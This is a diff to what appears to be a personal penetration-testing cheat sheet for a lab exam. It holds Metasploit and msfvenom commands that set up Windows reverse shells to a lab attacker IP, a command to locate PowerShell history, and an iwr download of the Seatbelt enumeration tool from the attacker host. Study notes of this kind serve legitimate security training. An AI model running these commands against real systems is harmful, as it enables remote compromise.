@@ -32,7 +32,7 @@ gci -recurse -File -ErrorAction SilentlyContinue -Path "\" -filter "flag.txt"
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.181;set LPORT 443;run;"
 METERPRETER REVERSE SHELL LISTENER
 
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=8443 -f python -b "\x00\x20" -v shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f python -b "\x00\x20" -v shellcode
 REGULAR REVERSE SHELL SHELLCODE
 
 
@@ -44,3 +44,15 @@ it's attempting to bypass the execution policy that might be in place, so you ca
 
 **FORCE TO KILL ANY PORT**
 For an 'all in one' linux command, check out [fuser](https://linux.die.net/man/1/fuser). `fuser -k 8080/tcp 8080/udp` should kill anything listening on 8080.
+
+
+(Get-PSReadlineOption).HistorySavePath to get the location of your history file
+
+To transfer files from your kali to a machine using PS 
+PS C:\Users\dave> iwr -uri http://192.168.45.179/Seatbelt.exe -Outfile Seatbelt.exe
+iwr -uri http://192.168.45.179/Seatbelt.exe -Outfile Seatbelt.exe
+(Make sure your http server is open so the machines picks it up)
+![[Pasted image 20231024181428.png]]
+
+
+
